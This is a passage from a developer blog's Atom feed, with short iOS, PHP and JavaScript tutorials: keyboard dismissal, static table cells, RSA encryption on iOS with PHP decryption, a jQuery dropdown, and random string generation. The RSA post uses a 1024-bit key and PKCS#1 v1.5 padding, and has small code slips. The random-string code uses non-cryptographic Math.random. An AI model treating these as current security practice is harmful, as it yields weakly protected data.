class="keyword">self</span>.tableView];</span><br><span class="line">    <span class="built_in">NSIndexPath</span> *indexPath = [<span class="keyword">self</span>.tableView indexPathForRowAtPoint:point];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Let say you are editing first section first row</span></span><br><span class="line">    <span class="keyword">if</span> (indexPath != <span class="literal">nil</span> &amp;&amp; indexPath.section == <span class="number">0</span> &amp;&amp; indexPath.row == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    [<span class="keyword">self</span>.firstRowTextField resignFirstResponder];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In this case we are talking about the first section first row contain a UITextField which allows user to edit.</p><p>You want the keyboard to keep appear if the user tap back the row which they’re editing, so just <code>return</code> and end the function. Otherwise, the keyboard will be hide (i.e. make the <code>firstRowTextField</code> lost focus)</p><p><code>UITapGestureRecognizer</code> is like an event listener to listen for <strong>Tap</strong> event, if the <strong>Tap</strong> event occurred, <code>hideKeyboard</code> will be triggered and passed itself as an argument. The <code>hideKeyboard</code> will then act accordingly.</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;In certain circumstances (i.e. The table row to edit.), we do want the keyboard to be hide in order to improve user experience&lt;/p&gt;
&lt;p&gt;In</summary>
        
      
    
    
    
    
    <category term="programming" scheme="http://jslim.net/tags/programming/"/>
    
    <category term="ios" scheme="http://jslim.net/tags/ios/"/>
    
  </entry>
  
  <entry>
    <title>UITableViewController doesn&#39;t show content with static cell</title>
    <link href="http://jslim.net/blog/2013/01/20/uitableviewcontroller-doesnt-show-content-with-static-cell/"/>
    <id>http://jslim.net/blog/2013/01/20/uitableviewcontroller-doesnt-show-content-with-static-cell/</id>
    <published>2013-01-20T08:32:00.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>I’ve been struggle for some time just because of the tableView doesn’t show any content to me.</p><p>The situation is, I’m trying to create a tableView with some sections and static cells, and it served as a rootViewController of a navigationController.</p><p>Finally I solved the problem by commenting out the following line in tableViewController.m</p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> mark - Table view data source</span></span><br><span class="line"></span><br><span class="line">- (<span class="built_in">NSInteger</span>)numberOfSectionsInTableView:(<span class="built_in">UITableView</span> *)tableView</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">warning</span> Potentially incomplete method implementation.</span></span><br><span class="line">        <span class="comment">// Return the number of sections.</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (<span class="built_in">NSInteger</span>)tableView:(<span class="built_in">UITableView</span> *)tableView numberOfRowsInSection:(<span class="built_in">NSInteger</span>)section</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">warning</span> Incomplete method implementation.</span></span><br><span class="line">        <span class="comment">// Return the number of rows in the section.</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (<span class="built_in">UITableViewCell</span> *)tableView:(<span class="built_in">UITableView</span> *)tableView cellForRowAtIndexPath:(<span class="built_in">NSIndexPath</span> *)indexPath</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">static</span> <span class="built_in">NSString</span> *CellIdentifier = <span class="string">@&quot;Cell&quot;</span>;</span><br><span class="line">            <span class="built_in">UITableViewCell</span> *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier forIndexPath:indexPath];</span><br><span class="line">                </span><br><span class="line">                    <span class="comment">// Configure the cell...</span></span><br><span class="line">                        </span><br><span class="line">                            <span class="keyword">return</span> cell;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> mark - Table view delegate</span></span><br><span class="line"></span><br><span class="line">- (<span class="type">void</span>)tableView:(<span class="built_in">UITableView</span> *)tableView didSelectRowAtIndexPath:(<span class="built_in">NSIndexPath</span> *)indexPath</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>These lines are auto-generated by Xcode which I don’t need it.</p><p>When you faced a problem and doesn’t found any solution in google, don’t panic, just continue to try again and again, the problem will be solved. :)</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;I’ve been struggle for some time just because of the tableView doesn’t show any content to me.&lt;/p&gt;
&lt;p&gt;The situation is, I’m trying to</summary>
        
      
    
    
    
    
    <category term="programming" scheme="http://jslim.net/tags/programming/"/>
    
    <category term="ios" scheme="http://jslim.net/tags/ios/"/>
    
  </entry>
  
  <entry>
    <title>RSA encryption in iOS and decrypt it using PHP</title>
    <link href="http://jslim.net/blog/2013/01/05/rsa-encryption-in-ios-and-decrypt-it-using-php/"/>
    <id>http://jslim.net/blog/2013/01/05/rsa-encryption-in-ios-and-decrypt-it-using-php/</id>
    <published>2013-01-05T05:20:00.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>I’ve been suffer for few weeks on RSA encryption in iOS. Now I would like to share the way of doing this.</p><p>First, generate a key-pair using SSL.</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ openssl req -x509 -out public_key.der -outform der -<span class="keyword">new</span> <span class="type"></span>-<span class="keyword">new</span><span class="type">key</span> rsa:<span class="type">1024 -keyout private_key</span>.pem -days <span class="number">3650</span></span><br></pre></td></tr></table></figure><p>There are few points have to mention:</p><ul><li><code>public_key.der</code> is an output based on x509 certificate. Note that in iOS must be <code>.der</code> format but not <code>.pem</code></li><li><code>private_key.pem</code> is the private key that you can use it to decrypt</li><li><code>rsa:1024</code> is the key length. The longer the length, the safer it is</li><li><code>-days</code> is the days for effective period for this cert. In this case, is 10-Years</li></ul><p>Now, drag <code>public_key.der</code> to your iOS project and create 2 files: <strong>RSA.h</strong> and <strong>RSA.m</strong></p><p><strong>RSA.h</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#import <span class="string">&lt;Foundation/Foundation.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">RSA</span> : <span class="title">NSObject</span> </span>&#123;</span><br><span class="line">    SecKeyRef publicKey;</span><br><span class="line">    SecCertificateRef certificate;</span><br><span class="line">    SecPolicyRef policy;</span><br><span class="line">    SecTrustRef trust;</span><br><span class="line">    size_t maxPlainLen;</span><br><span class="line">&#125;</span><br><span class="line">- (<span class="built_in">NSData</span> *) encryptWithData:(<span class="built_in">NSData</span> *)content;</span><br><span class="line">- (<span class="built_in">NSData</span> *) encryptWithString:(<span class="built_in">NSString</span> *)content;</span><br><span class="line">- (<span class="built_in">NSString</span> *) encryptToString:(<span class="built_in">NSString</span> *)content;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@end</span></span><br></pre></td></tr></table></figure><p><strong>RSA.m</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#import <span class="string">&quot;RSA.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">@implementation</span> <span class="title">RSA</span></span></span><br><span class="line"> </span><br><span class="line">- (<span class="type">id</span>)init &#123;</span><br><span class="line">    <span class="keyword">self</span> = [<span class="variable language_">super</span> init];</span><br><span class="line">     </span><br><span class="line">    <span class="built_in">NSString</span> *publicKeyPath = [[<span class="built_in">NSBundle</span> mainBundle] pathForResource:<span class="string">@&quot;public_key&quot;</span></span><br><span class="line">                                                     ofType:<span class="string">@&quot;der&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (publicKeyPath == <span class="literal">nil</span>) &#123;</span><br><span class="line">        <span class="built_in">NSLog</span>(<span class="string">@&quot;Can not find pub.der&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="built_in">NSDate</span> *publicKeyFileContent = [<span class="built_in">NSData</span> dataWithContentsOfFile:publicKeyPath];</span><br><span class="line">    <span class="keyword">if</span> (publicKeyFileContent == <span class="literal">nil</span>) &#123;</span><br><span class="line">        <span class="built_in">NSLog</span>(<span class="string">@&quot;Can not read from pub.der&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    certificate = SecCertificateCreateWithData(kCFAllocatorDefault, ( __bridge <span class="built_in">CFDataRef</span>)publicKeyFileContent);</span><br><span class="line">    <span class="keyword">if</span> (certificate == <span class="literal">nil</span>) &#123;</span><br><span class="line">        <span class="built_in">NSLog</span>(<span class="string">@&quot;Can not read certificate from pub.der&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    policy = SecPolicyCreateBasicX509();</span><br><span class="line">    OSStatus returnCode = SecTrustCreateWithCertificates(certificate, policy, &amp;trust);</span><br><span class="line">    <span class="keyword">if</span> (returnCode != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">NSLog</span>(<span class="string">@&quot;SecTrustCreateWithCertificates fail. Error Code: %ld&quot;</span>, returnCode);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    SecTrustResultType trustResultType;</span><br><span class="line">    returnCode = SecTrustEvaluate(trust, &amp;trustResultType);</span><br><span class="line">    <span class="keyword">if</span> (returnCode != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    publicKey = SecTrustCopyPublicKey(trust);</span><br><span class="line">    <span class="keyword">if</span> (publicKey == <span class="literal">nil</span>) &#123;</span><br><span class="line">        <span class="built_in">NSLog</span>(<span class="string">@&quot;SecTrustCopyPublicKey fail&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    maxPlainLen = SecKeyGetBlockSize(publicKey) - <span class="number">12</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">self</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">- (<span class="built_in">NSData</span> *) encryptWithData:(<span class="built_in">NSData</span> *)content &#123;</span><br><span class="line">     </span><br><span class="line">    size_t plainLen = [content length];</span><br><span class="line">    <span class="keyword">if</span> (plainLen &gt; maxPlainLen) &#123;</span><br><span class="line">        <span class="built_in">NSLog</span>(<span class="string">@&quot;content(%ld) is too long, must &lt; %ld&quot;</span>, plainLen, maxPlainLen);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="type">void</span> *plain = malloc(plainLen);</span><br><span class="line">    [content getBytes:plain</span><br><span class="line">               length:plainLen];</span><br><span class="line">     </span><br><span class="line">    size_t cipherLen = <span class="number">128</span>; <span class="comment">// currently RSA key length is set to 128 bytes</span></span><br><span class="line">    <span class="type">void</span> *cipher = malloc(cipherLen);</span><br><span class="line">     </span><br><span class="line">    OSStatus returnCode = SecKeyEncrypt(publicKey, kSecPaddingPKCS1, plain,</span><br><span class="line">                                        plainLen, cipher, &amp;cipherLen);</span><br><span class="line">     </span><br><span class="line">    <span class="built_in">NSData</span> *result = <span class="literal">nil</span>;</span><br><span class="line">    <span class="keyword">if</span> (returnCode != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">NSLog</span>(<span class="string">@&quot;SecKeyEncrypt fail. Error Code: %ld&quot;</span>, returnCode);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        result = [<span class="built_in">NSData</span> dataWithBytes:cipher</span><br><span class="line">                                length:cipherLen];</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    free(plain);</span><br><span class="line">    free(cipher);</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">- (<span class="built_in">NSData</span> *) encryptWithString:(<span class="built_in">NSString</span> *)content &#123;</span><br><span class="line">    <span class="keyword">return</span> [<span class="keyword">self</span> encryptWithData:[content dataUsingEncoding:<span class="built_in">NSUTF8StringEncoding</span>]];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (<span class="built_in">NSString</span> *) encryptToString:(<span class="built_in">NSString</span> *)content &#123;</span><br><span class="line">    <span class="built_in">NSData</span> *data = [<span class="keyword">self</span> encryptWithString:content];</span><br><span class="line">    <span class="keyword">return</span> [<span class="keyword">self</span> base64forData:data];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// convert NSData to NSString</span></span><br><span class="line">- (<span class="built_in">NSString</span>*)base64forData:(<span class="built_in">NSData</span>*)theData &#123;</span><br><span class="line">    <span class="keyword">const</span> uint8_t* input = (<span class="keyword">const</span> uint8_t*)[theData bytes];</span><br><span class="line">    <span class="built_in">NSInteger</span> length = [theData length];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="type">char</span> table[] = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">NSMutableData</span>* data = [<span class="built_in">NSMutableData</span> dataWithLength:((length + <span class="number">2</span>) / <span class="number">3</span>) * <span class="number">4</span>];</span><br><span class="line">    uint8_t* output = (uint8_t*)data.mutableBytes;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">NSInteger</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; length; i += <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="built_in">NSInteger</span> value = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">NSInteger</span> j;</span><br><span class="line">        <span class="keyword">for</span> (j = i; j &lt; (i + <span class="number">3</span>); j++) &#123;</span><br><span class="line">            value &lt;&lt;= <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (j &lt; length) &#123;</span><br><span class="line">                value |= (<span class="number">0xFF</span> &amp; input[j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">NSInteger</span> theIndex = (i / <span class="number">3</span>) * <span class="number">4</span>;</span><br><span class="line">        output[theIndex + <span class="number">0</span>] =                    table[(value &gt;&gt; <span class="number">18</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">        output[theIndex + <span class="number">1</span>] =                    table[(value &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">        output[theIndex + <span class="number">2</span>] = (i + <span class="number">1</span>) &lt; length ? table[(value &gt;&gt; <span class="number">6</span>)  &amp; <span class="number">0x3F</span>] : <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">        output[theIndex + <span class="number">3</span>] = (i + <span class="number">2</span>) &lt; length ? table[(value &gt;&gt; <span class="number">0</span>)  &amp; <span class="number">0x3F</span>] : <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [[[<span class="built_in">NSString</span> alloc] initWithData:data encoding:<span class="built_in">NSASCIIStringEncoding</span>] autorelease];</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">- (<span class="type">void</span>)dealloc&#123;</span><br><span class="line">    <span class="built_in">CFRelease</span>(certificate);</span><br><span class="line">    <span class="built_in">CFRelease</span>(trust);</span><br><span class="line">    <span class="built_in">CFRelease</span>(policy);</span><br><span class="line">    <span class="built_in">CFRelease</span>(publicKey);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">@end</span></span><br></pre></td></tr></table></figure><p><strong>Usage</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#import <span class="string">&quot;RSA.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">RSA *rsa = [[RSA alloc] init];</span><br><span class="line"><span class="keyword">if</span> (rsa != <span class="literal">nil</span>) &#123;</span><br><span class="line">    <span class="comment">// just post the string to server</span></span><br><span class="line">    <span class="built_in">NSLog</span>(<span class="string">@&quot;%@&quot;</span>, [rsa encryptToString:<span class="string">@&quot;This is plaintext&quot;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">NSLog</span>(<span class="string">@&quot;Error&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The iOS part is done. Now let’s decrypt in PHP. Before that, let’s download <a href="http://phpseclib.sourceforge.net/">phpseclib</a> for decryption.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">set_include_path</span>(<span class="title function_ invoke__">get_include_path</span>() . PATH_SEPARATOR . <span class="string">&#x27;phpseclib&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;Crypt/RSA.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$rsa</span> = <span class="keyword">new</span> <span class="title class_">Crypt</span>_RSA();</span><br><span class="line"><span class="variable">$rsa</span>-&gt;<span class="title function_ invoke__">setPassword</span>(<span class="string">&#x27;yourPassword&#x27;</span>);</span><br><span class="line"><span class="variable">$rsa</span>-&gt;<span class="title function_ invoke__">loadKey</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/path/to/private_key.pem&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$rsa</span>-&gt;<span class="title function_ invoke__">setEncryptionMode</span>(CRYPT_RSA_ENCRYPTION_PKCS1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$rsa</span>-&gt;<span class="title function_ invoke__">decrypt</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ciphertext&#x27;</span>]));</span><br></pre></td></tr></table></figure><p>Have fun :)</p><p><em>References:</em></p><ul><li><em><a href="http://stackoverflow.com/questions/14018651/rsa-ios-encrypt-php-decrypt">RSA iOS encrypt &amp; PHP decrypt</a></em></li><li><em><a href="http://blog.iamzsx.me/show.html?id=155002">iOS下的RSA加密方法</a></em></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;I’ve been suffer for few weeks on RSA encryption in iOS. Now I would like to share the way of doing this.&lt;/p&gt;
&lt;p&gt;First, generate a</summary>
        
      
    
    
    
    
    <category term="php" scheme="http://jslim.net/tags/php/"/>
    
    <category term="ios" scheme="http://jslim.net/tags/ios/"/>
    
  </entry>
  
  <entry>
    <title>Ajax change dropdown list value with jQuery</title>
    <link href="http://jslim.net/blog/2012/12/28/ajax-change-dropdown-list-value-with-jquery/"/>
    <id>http://jslim.net/blog/2012/12/28/ajax-change-dropdown-list-value-with-jquery/</id>
    <published>2012-12-28T04:29:00.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>A typical example for this is <strong>Country</strong> and <strong>State/Province</strong>.</p><p>You may have seen some website that provide such a dropdown list. When you change the <strong>Country</strong>, the <strong>State</strong> will be reloaded.</p><p>Now, I want to show this example using jQuery.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    $(<span class="string">&#x27;#country&#x27;</span>).<span class="title function_">change</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">            <span class="attr">url</span>: <span class="string">&#x27;/ajax/state&#x27;</span>,</span><br><span class="line">            <span class="attr">dataType</span>: <span class="string">&#x27;json&#x27;</span>,</span><br><span class="line">            <span class="attr">type</span>: <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">            <span class="comment">// This is query string i.e. country_id=123</span></span><br><span class="line">            <span class="attr">data</span>: &#123;country_id : $(<span class="string">&#x27;#country&#x27;</span>).<span class="title function_">val</span>()&#125;,</span><br><span class="line">            <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params">data</span>) &#123;</span><br><span class="line">                $(<span class="string">&#x27;#state&#x27;</span>).<span class="title function_">empty</span>(); <span class="comment">// clear the current elements in select box</span></span><br><span class="line">                <span class="keyword">for</span> (row <span class="keyword">in</span> data) &#123;</span><br><span class="line">                    $(<span class="string">&#x27;#state&#x27;</span>).<span class="title function_">append</span>($(<span class="string">&#x27;&lt;option&gt;&lt;/option&gt;&#x27;</span>).<span class="title function_">attr</span>(<span class="string">&#x27;value&#x27;</span>, data[row].<span class="property">stateId</span>).<span class="title function_">text</span>(data[row].<span class="property">stateName</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">error</span>: <span class="keyword">function</span>(<span class="params">jqXHR, textStatus, errorThrown</span>) &#123;</span><br><span class="line">                <span class="title function_">alert</span>(errorThrown);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><em>Reference: <a href="http://stackoverflow.com/questions/1801499/how-to-change-options-of-select-with-jquery#answers">How to change options of &lt;select &gt; with jQuery?</a></em></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;A typical example for this is &lt;strong&gt;Country&lt;/strong&gt; and &lt;strong&gt;State/Province&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;You may have seen some website that</summary>
        
      
    
    
    
    
    <category term="javascript" scheme="http://jslim.net/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>Generate a random string with JavaScript</title>
    <link href="http://jslim.net/blog/2012/12/26/generate-a-random-string-with-javascript/"/>
    <id>http://jslim.net/blog/2012/12/26/generate-a-random-string-with-javascript/</id>
    <published>2012-12-26T11:24:00.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>In order to generate a random string, we must first specify <strong>length of string</strong> and <strong>character set</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">generateRandom</span>(<span class="params">lengthOfString, charset</span>) &#123;</span><br><span class="line">    <span class="comment">// The scope of the character</span></span><br><span class="line">    <span class="keyword">if</span>(charset == <span class="literal">null</span>) charset = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> rand = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(lengthOfString &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        since the index of char is start from 0, so no need to +1 on the random number</span></span><br><span class="line"><span class="comment">        we want the range from 0 - lengthOfString</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        rand += charset.<span class="title function_">charAt</span>(<span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * charset.<span class="property">length</span>));</span><br><span class="line">        lengthOfString--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> rand;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>References:</em></p><ul><li><em><a href="http://www.w3schools.com/jsref/jsref_random.asp">W3 School - JavaScript random() Method</a></em></li><li><em><a href="http://www.w3schools.com/jsref/jsref_charat.asp">W3 School - JavaScript charAt() Method</a></em></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;In order to generate a random string, we must first specify &lt;strong&gt;length of string&lt;/strong&gt; and &lt;strong&gt;character</summary>
        
      
    
    
    
    
    <category term="programming" scheme="http://jslim.net/tags/programming/"/>
    
    <category term="javascript" scheme="http://jslim.net/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>Remove Macbuntu from Ubuntu 12.10</title>
